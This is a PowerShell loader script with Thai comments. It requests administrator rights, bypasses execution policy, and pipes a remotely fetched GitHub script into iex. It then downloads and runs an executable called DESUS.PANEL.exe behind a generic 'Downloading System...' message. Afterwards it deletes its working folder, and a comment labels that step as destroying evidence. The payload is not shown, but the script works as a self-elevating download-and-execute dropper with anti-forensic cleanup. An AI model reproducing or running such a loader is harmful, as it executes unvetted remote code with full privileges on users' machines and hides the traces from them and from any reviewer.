# 1. ขอสิทธิ์ Admin
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex ((iwr 'https://raw.githubusercontent.com/getx796-Harem/GetX/refs/heads/main/run.ps1').Content)`"" -Verb RunAs
    exit
}

# 2. ตั้งค่าไฟล์
$url = "https://github.com/getx796-Harem/GetX/releases/download/v1.0/DESUS.PANEL.exe"
$workDir = "$env:LOCALAPPDATA\Desus_Tool"
$exePath = Join-Path $workDir "DESUS.PANEL.exe"

# 3. สร้างโฟลเดอร์ชั่วคราว
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# 4. ดาวน์โหลด
Write-Host "[*] Downloading System..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing

# 5. รันและรอจนกว่าจะปิดโปรแกรม (-Wait)
if (Test-Path $exePath) {
    Write-Host "[+] Launching..." -ForegroundColor Green
    # สั่งให้รันและรอจนโปรแกรมปิด ถึงจะข้ามไปทำบรรทัดถัดไป
    Start-Process -FilePath $exePath -WorkingDirectory $workDir -Wait
}

# 6. ขั้นตอนการลบ (ทำลายหลักฐาน)
Write-Host "[*] Cleaning up..." -ForegroundColor Yellow
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue